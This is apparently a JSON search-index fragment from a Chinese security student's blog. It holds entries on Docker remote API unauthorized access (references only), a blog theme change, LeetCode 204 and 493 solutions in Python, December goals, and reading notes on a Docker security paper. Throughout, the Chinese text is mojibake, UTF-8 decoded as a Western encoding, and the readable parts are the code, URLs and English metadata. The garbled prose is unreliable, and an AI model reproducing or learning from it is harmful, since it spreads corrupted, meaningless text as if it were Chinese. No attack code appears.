","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:3:0","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—1:Docker remote apiæœªæˆæƒè®¿é—®","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#å…¶ä»–æ”¶è·"},{"categories":["å®è·µè®°å½•"],"content":"å‚è€ƒé“¾æ¥ï¼š Docker remote apiæ¼æ´å…¬å‘Š å¼€å¯dockerçš„remote api è¸©å‘ï¼šè§£å†³ubuntu-crontabåå¼¹shellå¤±è´¥çš„é—®é¢˜ ä»–äººçš„å®ç°ï¼š ğŸ‚äººåšå®¢ä¹‹ä¸€ https://www.ouyangxiaoze.com/2020/08/617.html ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:4:0","series":null,"tags":["Linux","Docker"],"title":"Dockeré€ƒé€¸ç³»åˆ—1:Docker remote apiæœªæˆæƒè®¿é—®","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#å‚è€ƒé“¾æ¥"},{"categories":["æ–‡å­—"],"content":"æ›´æ¢ä¸»é¢˜çš„åŸå›  æœ¬åšå®¢ä»¥å‰çš„ä¸»é¢˜æ˜¯fluidï¼Œåˆšå¼€å§‹è§‰å¾—çœ‹ç€éå¸¸èˆ’æœï¼Œä¹Ÿæ¯”è¾ƒç®€æ´ã€‚ä½†æ˜¯ç”¨ä¹…äº†å°±å‘ç°ï¼Œæ¯æ¬¡å½“æˆ‘æƒ³åˆ›å»ºä¸€ç¯‡åšå®¢è®°å½•ä¸€ä¸‹è‡ªå·±çš„æƒ³æ³•æ—¶ï¼Œæˆ‘éƒ½è¦å»æ‰¾é¦–é¡µçš„ç¼©ç•¥å›¾ç´ æå’Œåšå®¢çš„èƒŒæ™¯å›¾ç´ æã€‚å¯¹äºæœ¬æ¥å°±æ¯”è¾ƒæ‡’æ•£çš„æˆ‘æ¥è¯´ï¼Œè¿™æ— ç–‘æ˜¯æ¯”è¾ƒæŠ˜ç£¨çš„ã€‚äºæ˜¯ï¼Œæˆ‘æƒ³ç€å¼€è®¾åšå®¢çš„åˆå¿ƒæ˜¯å†™ä½œï¼Œä¸»ä½“è¿˜åº”è¯¥æ˜¯æ–‡å­—ã€‚æ‰€ä»¥ï¼Œåœ¨çœ‹è¿‡å‡ ä¸ªä½¿ç”¨cactusä¸»é¢˜çš„å¤§ä½¬åšå®¢ä¹‹åï¼Œæˆ‘å†³å®šæŠŠä¸»é¢˜ä¹Ÿæ”¹ä¸ºcactusã€‚ç©¶å…¶åŸå› ï¼Œæˆ‘æƒ³æ˜¯ä¸ºäº†å‡å°‘åœºå¤–å› ç´ ï¼Œæé«˜è‡ªå·±çš„ä¸“æ³¨åº¦å§ã€‚ ","date":"2021-02-06","objectID":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/:0:1","series":null,"tags":["ç¢ç¢å¿µ","Blog"],"title":"æ›´æ¢ä¸»é¢˜ä¹‹cactus","uri":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/#æ›´æ¢ä¸»é¢˜çš„åŸå› "},{"categories":["æ–‡å­—"],"content":"æ•°å­¦å…¬å¼æ¸²æŸ“ åœ¨æ›´æ¢ä¸»é¢˜ä¸ºcactusä¹‹åï¼Œæˆ‘å‘ç°åŸæœ¬çš„æ•°å­¦å…¬å¼æ¸²æŸ“ä¸å‡ºæ¥äº†ã€‚å—¯ï¼Œé‡åˆ°é—®é¢˜å°±å»è°·æ­Œå§ã€‚åœ¨å°è¯•äº†å‡ æ¬¡ä¹‹åï¼Œæˆ‘æŒ‰ç…§è¿™ç¯‡åšå®¢çš„æ–¹æ³•è§£å†³äº†æ•°å­¦å…¬å¼æ¸²æŸ“çš„é—®é¢˜ã€‚ æ€»çš„æ¥è¯´ï¼Œéœ€è¦å¸è½½hexoåŸæœ¬çš„hexo-renderer-markedï¼Œç„¶åå®‰è£…hexo-renderer-kramedå’Œhexo-renderer-mathjaxã€‚å¦‚æœä¹‹å‰åƒæˆ‘ä¸€æ ·å®‰è£…è¿‡hexo-mathçš„è¯ï¼Œä¹Ÿéœ€è¦æŠŠhexo-mathå¸è½½ã€‚ æœ€åå†ä¿®æ”¹ä¸€äº›å†å²é—ç•™é—®é¢˜å°±èƒ½å¤Ÿåœ¨ç½‘é¡µä¸Šçœ‹åˆ°æ•°å­¦å…¬å¼äº†ã€‚ ","date":"2021-02-06","objectID":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/:0:2","series":null,"tags":["ç¢ç¢å¿µ","Blog"],"title":"æ›´æ¢ä¸»é¢˜ä¹‹cactus","uri":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/#æ•°å­¦å…¬å¼æ¸²æŸ“"},{"categories":["æ–‡å­—"],"content":"ä¸€äº›æ³¨æ„ç‚¹ å†™ä½œçš„æ—¶å€™ä¸€å®šè¦éµå¾ªmarkdownçš„è¯­æ³•è§„èŒƒã€‚å¤šè¡Œä»£ç å—çš„å‰åä¸€å®šè¦ç•™ç©ºè¡Œï¼Œå¦åˆ™å½“åé¢çš„å†…å®¹ä¸­æœ‰è¡Œå†…ä»£ç å—æ—¶ï¼Œåœ¨æ¸²æŸ“çš„æ—¶å€™\u003ccode\u003eå—å°±ä¸ä¼šç»§æ‰¿æ®µè½Pçš„æ ·å¼å±æ€§ï¼Œé€ æˆè¡Œå†…ä»£ç å—ç‹¬å ä¸€è¡Œçš„æƒ…å†µã€‚ ä¿®æ”¹themes\\cactus\\source\\css\\style.stylæ–‡ä»¶ä¸­çš„codeå¤„ï¼Œå¢åŠ è‡ªå®šä¹‰çš„background-colorå±æ€§ï¼Œå¯ä»¥è‡ªå®šä¹‰è¡Œå†…ä»£ç å—çš„èƒŒæ™¯é¢œè‰²ï¼ŒåŸä¸»é¢˜çš„åŒè‰²æœ‰ç‚¹ä¸å¤ªå¥½çœ‹ã€‚ ","date":"2021-02-06","objectID":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/:0:3","series":null,"tags":["ç¢ç¢å¿µ","Blog"],"title":"æ›´æ¢ä¸»é¢˜ä¹‹cactus","uri":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/#ä¸€äº›æ³¨æ„ç‚¹"},{"categories":null,"content":"ç»å…¸æ•°å­¦é¢˜ï¼Œè®¡ç®—å°äºnçš„è´¨æ•°çš„ä¸ªæ•° ç»Ÿè®¡æ‰€æœ‰å°äºéè´Ÿæ•´æ•°Â nÂ çš„è´¨æ•°çš„æ•°é‡ã€‚ ç¤ºä¾‹ 1ï¼š è¾“å…¥ï¼šn = 10 è¾“å‡ºï¼š4 è§£é‡Šï¼šå°äº 10 çš„è´¨æ•°ä¸€å…±æœ‰ 4 ä¸ª, å®ƒä»¬æ˜¯ 2, 3, 5, 7 ã€‚ æ•°æ®èŒƒå›´ï¼š 0 \u003c= n \u003c= 5 * 106 ä¸€çœ‹ä»Šå¤©çš„æ¯æ—¥ä¸€é¢˜ï¼Œéš¾åº¦ç®€å•ï¼Œæˆ‘å¿ƒæƒ³è¿™ä¸æ˜¯10åˆ†é’Ÿå°±æŠŠå®ƒç»™å†²äº†ï¼Ÿçœ‹å®Œä¹‹åæ‰å‘ç°ï¼Œå®ƒè¯´å®ƒæ˜¯ç®€å•é¢˜ï¼Œå®ƒå¯ä¸æ˜¯ç®€å•é¢˜å•Šï¼Œå®ƒè¿™æ˜¯æœ‰å¤‡è€Œæ¥ï¼Œå®ƒæ˜æ˜å°±æ˜¯ä¸€é“æ•°å­¦é¢˜ã€‚ ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:0:0","series":null,"tags":["Leetcode","Python3","æ•°å­¦"],"title":"Lc 204 ç»å…¸é¢˜ç›®-è®¡ç®—è´¨æ•°ä¸ªæ•°","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#"},{"categories":null,"content":"åŸºç¡€è§£æ³• æœ€ç®€å•çš„æƒ³æ³•å½“ç„¶æ˜¯éå†ä»2å¼€å§‹çš„æ‰€æœ‰å°äºnçš„æ•°ï¼Œç„¶ååˆ¤æ–­æ˜¯å¦ä¸ºè´¨æ•°ï¼Œè¿™æ ·çš„è¯å¤æ‚åº¦å°†ä¼šæ˜¯$O(n \\sqrt{n})$ï¼Œæ„æ–™ä¹‹å†…ï¼Œä¼šè¶…æ—¶ï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•ä¸è¡Œã€‚ ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:1:0","series":null,"tags":["Leetcode","Python3","æ•°å­¦"],"title":"Lc 204 ç»å…¸é¢˜ç›®-è®¡ç®—è´¨æ•°ä¸ªæ•°","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#åŸºç¡€è§£æ³•"},{"categories":null,"content":"è¿›é˜¶ ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:2:0","series":null,"tags":["Leetcode","Python3","æ•°å­¦"],"title":"Lc 204 ç»å…¸é¢˜ç›®-è®¡ç®—è´¨æ•°ä¸ªæ•°","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#è¿›é˜¶"},{"categories":null,"content":"åŸƒæ°ç­›é€‰ è¿™ç§æ–¹æ³•ç”±å¸Œè…Šæ•°å­¦å®¶å„æ‹‰å¤šå¡ï¼ˆEratosthenesï¼‰æå‡ºï¼Œæ€è·¯æ˜¯éå†åˆ°ä¸€ä¸ªè´¨æ•°$x$åï¼Œå°†å…¶å€æ•°$2\\times x$ã€$3\\times x$ã€$4\\times x$â€¦éƒ½æ ‡è®°ä¸ºåˆæ•°ï¼Œè¿™æ ·åˆ©ç”¨äº†æ•°ä¸æ•°ä¹‹é—´çš„å…³è”æ€§ï¼Œå‡å°‘äº†å¾ˆå¤šæ²¡å¿…è¦çš„åˆ¤æ–­è´¨æ•°æ“ä½œã€‚è¿›ä¸€æ­¥ä¼˜åŒ–å…¶æ—¶é—´å¤æ‚åº¦ï¼Œå¯ä»¥å‘ç°ï¼Œä¸ç”¨ä»$2\\times x$å¼€å§‹ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¹ä¸€ä¸ªåˆæ•°è¿›è¡Œå¤šæ¬¡é‡å¤æ ‡è®°ï¼ˆæ¯”å¦‚$15 = 3\\times 5$ï¼‰ï¼Œåœ¨è®¡ç®—3æ—¶ä¼šä¹˜ä»¥5ï¼Œè€Œè®¡ç®—5æ—¶åˆä¼šä¹˜ä»¥3ã€‚æ‰€ä»¥å¯ä»¥ä»$x\\times x$å¼€å§‹æ ‡è®°ã€‚ class Solution: def countPrimes(self, n: int) -\u003e int: ''' åŸƒæ°ç­›é€‰æ³• ''' isPrime = [True for i in range(n)] res = 0 for j in range(2, n): if isPrime[j]: res += 1 print(j) tmp = j * j while tmp \u003c n: isPrime[tmp] = False tmp += j return res ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:2:1","series":null,"tags":["Leetcode","Python3","æ•°å­¦"],"title":"Lc 204 ç»å…¸é¢˜ç›®-è®¡ç®—è´¨æ•°ä¸ªæ•°","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#åŸƒæ°ç­›é€‰"},{"categories":null,"content":"çº¿æ€§ç­›é€‰ åœ¨åŸƒæ°ç­›é€‰çš„åŸºç¡€ä¸Šï¼Œè¿˜æ˜¯ä¼šæœ‰é‡å¤çš„æ ‡è®°åˆæ•°æ“ä½œï¼Œæ¯”å¦‚30åœ¨éå†åˆ°3çš„æ—¶å€™ï¼Œä¼šè¢«æ ‡è®°ä¸ºåˆæ•°($3\\times 3 \u003c 30$)ï¼Œéå†åˆ°5çš„æ—¶å€™ï¼Œåˆä¼šè¢«æ ‡è®°ä¸ºåˆæ•°ã€‚æ‰€ä»¥è¿˜éœ€è¦å¯¹è¿™ä¸ªæ–¹æ³•è¿›è¡Œä¼˜åŒ–ã€‚å‰äººå·²ç»æƒ³å‡ºçš„æ€è·¯æ˜¯ç©ºé—´æ¢æ—¶é—´ï¼Œåœ¨éå†çš„æ—¶å€™ä½¿ç”¨ä¸€ä¸ªæ•°ç»„å­˜å‚¨æ‰€é‡è§çš„è´¨æ•°ï¼Œæ•°ç»„ä¸º[$P_0, P_1, â€¦, P_i, â€¦$]ï¼Œå¹¶ä¸”å¯¹æ¯ä¸ªæ•°$x$ï¼Œå°†$x\\times P_i$æ ‡è®°ä¸ºåˆæ•°ï¼Œå¹¶ä¸”åˆ°$x\\equiv 0 \\pmod {P_i}$æ—¶ç»“æŸã€‚ å› ä¸ºå‡å¦‚$x \\equiv 0 \\pmod {P_i}$ï¼Œç„¶åå†å¾€åæ ‡è®°ï¼Œå³å°†$x \\times P_{i+1}$æ ‡è®°ä¸ºåˆæ•°ï¼Œé‚£ä¹ˆå› ä¸º$\\frac{x}{P_i} \\times P_{i+1} \u003e x$ï¼Œæ‰€ä»¥åœ¨åé¢éå†åˆ°$\\frac{x}{P_i} \\times P_{i+1}$è¿™ä¸ªæ•°æ—¶ï¼Œå°†å…¶ä¹˜ä»¥$P_{i}$å°±ä¼šæŠŠ$x \\times P_{i+1}$æ ‡è®°ä¸ºåˆæ•°ï¼Œä¸ä¹‹å‰çš„æ“ä½œé‡å¤ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥æŠŠåˆ°æ­¤åœæ­¢ï¼ŒæŠŠ$x \\times P_{i+1}$è¿™ä¸ªæ•°ç•™ç»™åé¢çš„å¤§äº$x$çš„æ•°å»æ ‡è®°ã€‚ class Solution: def countPrimes(self, n: int) -\u003e int: ''' çº¿æ€§ç­›é€‰æ³• ''' primes = [] isPrime = [True for i in range(n)] for i in range(2, n): if isPrime[i]: primes.append(i) j = 0 while j \u003c len(primes) and i * primes[j] \u003c n: isPrime[i * primes[j]] = False if i % primes[j] == 0: break j += 1 # print(primes) return len(primes) æ—¶é—´å¤æ‚åº¦ï¼š $O(n)$ï¼Œè¿™ä¸€ç‚¹æ˜¯è®©æˆ‘æ„Ÿè§‰æ¯”è¾ƒå‡ºä¹æ„æ–™çš„ï¼Œçœ‹æ¥è‡ªå·±è¿˜æ˜¯å¤ªèœäº† :-(ã€‚ ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:2:2","series":null,"tags":["Leetcode","Python3","æ•°å­¦"],"title":"Lc 204 ç»å…¸é¢˜ç›®-è®¡ç®—è´¨æ•°ä¸ªæ•°","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#çº¿æ€§ç­›é€‰"},{"categories":["æ–‡å­—"],"content":"è½¬çœ¼é—´2020å¹´å·²ç»åªå‰©ä¸‹æœ€åä¸€ä¸ªæœˆï¼Œæš‚ä¸”å±•æœ›ä¸€ä¸‹12æœˆå§ï¼Œä¹Ÿç»™è‡ªå·±å®šä¸€äº›ç›®æ ‡ã€‚ ","date":"2020-12-02","objectID":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/:0:0","series":null,"tags":["Life"],"title":"è¿æ¥12æœˆçš„åˆ°æ¥","uri":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/#"},{"categories":["æ–‡å­—"],"content":"çŠ¶æ€ æœ€è¿‘è‡ªå·±çš„çŠ¶æ€åº”è¯¥æ˜¯æ¯”ä»¥å‰è¦å¥½äº†ï¼Œè™½ç„¶ä¸æ—¶åœ°è¿˜æ˜¯ä¼šåšå‡ºæµªè´¹æ—¶é—´çš„è¡Œä¸ºï¼Œä½†æ˜¯æ¯”ä»¥å‰è¦å¥½å¾ˆå¤šã€‚ å¬çš„è®²åº§å¢å¤šï¼Œè®¤è¯†çš„äººå¢å¤šï¼Œä¹Ÿæ›´åŠ æ„è¯†åˆ°äº†è‡ªå·±ä¸å¤§ä½¬ä¹‹é—´çš„å·®è·ã€‚åˆ«äººå¯ä»¥åœ¨å¤§ä¸‰å¤§å››å°±å·²ç»æˆä¸ºCTFæŸä¸€æ–¹é¢çš„å¼ºè€…ï¼Œè€Œç ”ä¸€çš„æˆ‘è¿˜åœ¨ä¸ºå°å°çš„ç³»ç»Ÿè½¯ä»¶å®‰å…¨å®éªŒæŠ¥å‘Šè€Œè´¹å¿ƒã€‚çœ‹æ¥è¿˜æ˜¯å¤ªèœï¼Œå¾—å¤šåŠªåŠ›å­¦ä¹ ã€‚ å¸Œæœ›è‡ªå·±åœ¨è¿™äº›æ–¹é¢ä¹Ÿèƒ½æœ‰äº›å¤©èµ‹å§ï¼Œæ—¢ç„¶åˆæœŸçš„é€Ÿåº¦ä¸åŒï¼Œé‚£ä¹ˆåªèƒ½é€šè¿‡æ›´é«˜çš„åŠ é€Ÿåº¦æ¥è¶…è¶Šäº†é‚£ä¹ˆåªèƒ½å…ˆåœ¨äººå®¶å±è‚¡åé¢è¿½èµ¶äº†ã€‚ ","date":"2020-12-02","objectID":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/:1:0","series":null,"tags":["Life"],"title":"è¿æ¥12æœˆçš„åˆ°æ¥","uri":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/#çŠ¶æ€"},{"categories":["æ–‡å­—"],"content":"ç›®æ ‡ 12æœˆçš„é¦–è¦ç›®æ ‡ï¼Œå½“ç„¶æ˜¯æŠŠæ‰€æœ‰è¯¾çš„å°ä½œä¸šå¤§ä½œä¸šéƒ½å®Œæˆå§ï¼Œä¸è¿‡è¿™ä¸ªä¸œè¥¿æœ‰ddlåœ¨ï¼Œä¹Ÿæ²¡å•¥å¤ªå¥½æ‹…å¿ƒçš„ã€‚ 12æœˆå§ï¼Œä¹Ÿç»™è‡ªå·±å®šä¸€äº›ç›®æ ‡ å…¶æ¬¡å¸Œæœ›èƒ½å¤Ÿé˜…è¯»5ç¯‡ä»¥ä¸Šçš„æ–‡çŒ®ï¼Œå¯¹Linuxç³»ç»Ÿå’ŒDockerå®‰å…¨æœ‰ä¸€äº›å®é™…åŠ¨æ‰‹çš„æ“ä½œç»å†ï¼Œæ¯•ç«Ÿå¾—ç»™Ericç‚¹é¢å­å‘€ :-D ç„¶åç»§ç»­ä¿æŒæ—©ç¡æ—©èµ·ï¼Œè§„å¾‹é¥®é£Ÿã€è¿åŠ¨ï¼Œå°‘æµªè´¹æ—¶é—´å§ã€‚ å¦‚æœæœ‰æ—¶é—´çš„è¯ï¼Œåº”è¯¥ä¼šåœ¨31å·å†™ä¸€ç¯‡å¯¹è‡ªå·±è¿‡å»ä¸€å¹´çš„æ€»ç»“ï¼Œå¸Œæœ›èƒ½å¤Ÿå®Œæˆï¼ ä»¥åçš„è·¯ä¸å†ä¼šæœ‰ç—›è‹¦ æˆ‘ä»¬çš„æœªæ¥è¯¥æœ‰å¤šé…· ","date":"2020-12-02","objectID":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/:2:0","series":null,"tags":["Life"],"title":"è¿æ¥12æœˆçš„åˆ°æ¥","uri":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/#ç›®æ ‡"},{"categories":["ç®—æ³•"],"content":" Leetcode 493é¢˜ éš¾åº¦ï¼šå›°éš¾ æƒ³æŠŠè¿™é¢˜è®°å½•ä¸‹æ¥çš„åŸå› ï¼Œä¸»è¦æ˜¯é¢˜è§£çš„å½’å¹¶ç®—æ³•æ€è·¯æ¯”è¾ƒå…¸å‹ï¼Œæ‰€ä»¥å¸Œæœ›èƒ½å¤Ÿè®°ä½å¹¶æŒæ¡è¿™ç§æ–¹æ³•ã€‚ é¢˜ç›®è¦æ±‚å¯¹ä¸€ä¸ªæ•°ç»„è¿›è¡Œå¤„ç†ï¼Œè®¡ç®—å‡ºæ‰€æœ‰æ»¡è¶³nums[i] \u003e 2*nums[j]ä¸”i \u003c jçš„(i, j)å¯¹çš„ä¸ªæ•°ã€‚æµ‹è¯•ç”¨ä¾‹ä¸­æœ€é•¿æ•°ç»„é•¿åº¦ä¸º50000ã€‚é‚£å¾ˆæ˜¾ç„¶ï¼Œä¸èƒ½ä¸¤æ¬¡éå†ï¼Œå› ä¸ºO(n^2)è‚¯å®šä¼šè¶…æ—¶çš„ã€‚æ‰€ä»¥éœ€è¦å¯»æ±‚å…¶ä»–æ–¹æ³•ã€‚ å†æ¬¡æ€è€ƒè¦æ±‚ï¼Œiä¸jçš„å‰åé¡ºåºæ˜¯ç¡®å®šçš„ï¼Œè€Œä¸”åˆæ˜¯å¤„ç†æ•°ç»„ï¼Œå¹¶ä¸”è¦æ±‚ä½äºO(n^2)çš„å¤æ‚åº¦ï¼Œæ‰€ä»¥åº”è¯¥æƒ³åˆ°å½’å¹¶æ’åºï¼ˆå½“ç„¶ç°åœ¨çš„æˆ‘æ˜¯ä¸Šå¸è§†è§’ğŸ¤£ï¼‰ã€‚ å½’å¹¶æ’åºçš„è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡åˆå¹¶ä¸¤ä¸ªå·²ç»æ’å¥½åºçš„æ•°ç»„æ—¶ï¼Œå¯¹äºå›ºå®šå‰åé¡ºåºçš„ä¸‹æ ‡å¤„ç†å°±ä¼šå˜å¾—ç®€å•è®¸å¤šäº†ã€‚ åœ¨å®ç°çš„æ—¶å€™ï¼Œè¿˜å¯ä»¥ç»§ç»­å¯¹å¤„ç†è¿‡ç¨‹è¿›è¡Œéƒ¨åˆ†ä¼˜åŒ–ï¼Œpython3å®ç°ä»£ç å¦‚ä¸‹ï¼š from typing import List import time import random class Solution: def reversePairs(self, nums: List[int]) -\u003e int: ''' è¿™æ ·å°±ä¸è¶…æ—¶äº† ä½†æ˜¯è¿˜æ˜¯å¾ˆæ…¢ğŸ™„ ''' def countPairs(left: int, mid: int, right: int) -\u003e int: res = 0 lastj = mid + 1 # ç”±äºå·¦å³ä¸¤è¾¹æ˜¯å·²ç»æ’å¥½åºçš„ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ä¼˜åŒ–ï¼Œå¯¹ç¬¬ä¸€ä¸ªä¹‹åçš„iï¼Œjå¹¶ä¸éœ€è¦ä»å¤´å¼€å§‹éå† for i in range(left, mid + 1): while lastj \u003c= right and nums[i] \u003e 2 * nums[lastj]: lastj += 1 res += lastj - (mid + 1) return res def mergeAndCount(left: int, right: int) -\u003e int: if left == right: return 0 mid = (left + right) // 2 res = mergeAndCount(left, mid) + mergeAndCount(mid + 1, right) + countPairs(left, mid, right) i,j,k = left, mid+1, left while i \u003c mid+1 and j \u003c right+1: if nums[i] \u003c nums[j]: sortedNums[k] = nums[i] i += 1 else: sortedNums[k] = nums[j] j += 1 k += 1 while i \u003c mid+1: sortedNums[k] = nums[i] i += 1 k += 1 while j \u003c right+1: sortedNums[k] = nums[j] j += 1 k += 1 for t in range(left, right+1): nums[t] = sortedNums[t] return res if not nums: return 0 sortedNums = [0 for i in range(len(nums))] return mergeAndCount(0, len(nums)-1) if __name__ == \"__main__\": s = Solution() nums = [1, 26, 20, 66, 28, 75, 78, 15, 40, 64] # random.seed(time.time()) # for i in range(10): # nums.append(random.randrange(1,100)) print(nums) print(s.reversePairs(nums)) print(nums) 327é¢˜åŒæ ·ä¹Ÿç”¨åˆ°äº†è¿™ä¸ªæ€æƒ³ï¼Œåšå®¢è®°å½•åœ¨è¿™ ","date":"2020-11-28","objectID":"/2020-11-28-leetcode-493-%E7%BF%BB%E8%BD%AC%E5%AF%B9/:0:0","series":null,"tags":["Leetcode","Python3","å½’å¹¶"],"title":"Leetcode 493 ç¿»è½¬å¯¹","uri":"/2020-11-28-leetcode-493-%E7%BF%BB%E8%BD%AC%E5%AF%B9/#"},{"categories":null,"content":"ä¸€ç¯‡å…³äºDockerå®‰å…¨çš„ç»¼è¿°æ€§Paper ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:0:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#"},{"categories":null,"content":"1.æ–‡ç« åŸºæœ¬ä¿¡æ¯ Titleï¼šAnalysis Of Docker Security Authorï¼šThanh Bui, Aalto University School of Science å‘å¸ƒæ—¥æœŸï¼š2015.1.13 é“¾æ¥ï¼šhttps://arxiv.org/abs/1501.02967 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:1:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#1æ–‡ç« åŸºæœ¬ä¿¡æ¯"},{"categories":null,"content":"2.å†…å®¹æ¦‚æ‹¬ è¿™ç¯‡æ–‡ç« ä¸»è¦å¯¹Dockerå®‰å…¨è¿›è¡Œäº†æ€»ä½“ä¸Šçš„åˆ†æï¼Œåå‘äºèµ„æ–™æœé›†ç±»å‹ã€‚ æ–‡ç« å°†Dockerçš„å®‰å…¨åˆ†ä¸ºä¸¤ä¸ªå¤§æ–¹é¢ï¼Œä¸€æ–¹é¢æ˜¯Dockerè‡ªèº«çš„å®‰å…¨ï¼Œä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯Dockerå„å®¹å™¨ä¹‹é—´çš„å®‰å…¨ï¼Œåˆ†æå®ƒä»¬ä¹‹é—´æ˜¯å¦å­˜åœ¨èµ„æºæœªæˆæƒè®¿é—®ç­‰é—®é¢˜ï¼Œå¦ä¸€æ–¹é¢æ˜¯Dockerä¸å®¿ä¸»æœºä¹‹é—´çš„å®‰å…¨é—®é¢˜ æ–‡ç« ä¸»è¦åˆ†æäº†Dockerä¸ºäº†å®ç°å®‰å…¨æ‰€é‡‡ç”¨çš„ä¸€äº›æªæ–½ï¼Œæ¯”å¦‚ä½¿ç”¨Linuxä¸­çš„cgroupså’Œnamespaceæœºåˆ¶ï¼Œä»¥åŠä½¿ç”¨Linuxæä¾›çš„AppArmorå’ŒSELinuxå®‰å…¨æ¨¡å—ã€‚å…¶å®è¿™äº›å®‰å…¨æªæ–½çš„åŸºæœ¬æ€æƒ³ï¼Œæˆ‘è®¤ä¸ºéƒ½æ˜¯èµ„æºéš”ç¦»ã€‚é€šè¿‡èµ„æºéš”ç¦»æ‰‹æ®µï¼Œè®©ä¸€ä¸ªå®¹å™¨åªèƒ½çœ‹åˆ°å®ƒæ‰€åº”è¯¥çœ‹åˆ°çš„èµ„æºã€‚ æœ€åï¼Œæ–‡ç« å¾—å‡ºç»“è®ºï¼ŒDockerç›¸æ¯”äºè™šæ‹Ÿæœºæ¥è¯´ï¼Œèƒ½å¤Ÿå®ç°æ›´é«˜å¯†åº¦çš„è™šæ‹ŸåŒ–ç¯å¢ƒï¼Œä½†æ˜¯å®‰å…¨åº¦æ¯”è™šæ‹Ÿæœºè¦æ›´ä½ã€‚ä½†æ˜¯ï¼Œå³ä½¿æ˜¯ä½¿ç”¨é»˜è®¤é…ç½®ï¼ŒDockeræœ¬èº«ä¹Ÿæ˜¯æŒºå®‰å…¨çš„ã€‚ç»™äºˆä¸€ä¸ªå®¹å™¨å¤ªå¤šç‰¹æƒï¼Œæ˜¯æ¯”è¾ƒå±é™©çš„æ“ä½œï¼Œæ›´åŠ å®‰å…¨çš„åšæ³•æ˜¯ä¸ç»™å®¹å™¨ç‰¹æƒï¼ˆä¸çŸ¥é“ç†è§£å¾—å¯¹ä¸å¯¹ğŸ¤£ï¼‰ã€‚ 